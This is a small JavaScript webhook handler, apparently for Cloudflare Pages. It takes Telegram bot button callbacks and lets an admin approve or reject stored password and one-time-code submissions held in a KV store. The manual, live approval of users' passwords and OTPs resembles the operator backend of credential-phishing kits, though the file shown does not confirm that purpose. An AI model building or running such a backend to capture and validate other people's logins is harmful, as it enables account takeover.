import { makeJsonResponse, getRequestFromKV, setRequestInKV } from "../_shared.js";

export async function onRequest(context) {
  const { request, env } = context;
  if (request.method !== "POST") return makeJsonResponse({ error: "Method not allowed" }, 405);

  let body;
  try {
    body = await request.json();
  } catch (error) {
    return makeJsonResponse({ error: "Invalid JSON" }, 400);
  }

  const update = body;
  if (!update || !update.callback_query) {
    return makeJsonResponse({ ok: true });
  }

  const callbackQuery = update.callback_query;
  const data = new URLSearchParams(callbackQuery.data);
  const requestId = data.get("requestId");
  const action = data.get("action");
  const token = data.get("token");

  if (token !== env.TELEGRAM_CALLBACK_TOKEN) {
    return makeJsonResponse({ ok: false, error: "Invalid token" }, 401);
  }

  // Try OTP first, then password
  let item = await getRequestFromKV(env, requestId, "otp");
  let type = "otp";
  
  if (!item) {
    item = await getRequestFromKV(env, requestId, "password");
    type = "password";
  }

  if (!item) {
    return makeJsonResponse({ ok: false, error: "Request not found" }, 404);
  }

  if (action === "approve") {
    item.approved = true;
    item.rejectedReason = null;
  } else if (action === "reject") {
    item.rejectedReason = "Admin rejected";
    item.approved = false;
  }

  await setRequestInKV(env, requestId, item, type);

  return makeJsonResponse({ ok: true });
}
